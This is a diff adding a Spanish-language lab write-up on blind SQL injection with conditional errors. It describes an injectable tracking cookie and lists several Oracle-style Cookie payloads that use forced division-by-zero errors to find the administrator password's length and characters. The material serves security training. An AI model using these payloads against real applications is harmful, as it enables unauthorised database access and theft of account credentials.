@@ -482,18 +482,25 @@ if __name__ == "__main__":
     print(colored(f"\n[✓] Contraseña encontrada: {final_password}", "green"))
 ```
 
+## Reto 12: Inyección SQL ciega con errores condicionales 
+
+Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.
+
+Los resultados de la consulta SQL no se devuelven y la aplicación no responde de forma diferente según si la consulta devuelve filas o no. Si la consulta SQL genera un error, la aplicación devuelve un mensaje de error personalizado.
+
+La base de datos contiene una tabla diferente llamada users, con columnas llamadas username y passwordNecesitas explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del administratorusuario.
+
+Para resolver el laboratorio, inicie sesión como administrator usuario. 
 
 
+Cookie: TrackingId=cMkoRqzxe2swLOUK'||(select case when(1=1) then to_char(1/0) else '' end from users where username='administrator')||'
+
+Cookie: TrackingId=cMkoRqzxe2swLOUK'||(select case when length(password)=20 then to_char(1/0) else '' end from users where username='administrator')||' ; session=usrsh1fR18X01MOdnWj4xeKTZZyM8ia9
+
+Cookie: TrackingId=cMkoRqzxe2swLOUK'||(select case when substr(username,1,1)='b' then to_char(1/0) else '' end from users where username='administrator')||' ; session=usrsh1fR18X01MOdnWj4xeKTZZyM8ia9
 
 
-
-
-
-
-
-
-
-
+Cookie: TrackingId=cMkoRqzxe2swLOUK'||(SELECT CASE WHEN substr(password,1,1)='r' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||' ; session=usrsh1fR18X01MOdnWj4xeKTZZyM8ia9
 
 ## ¿Qué es una SQLI ?
 
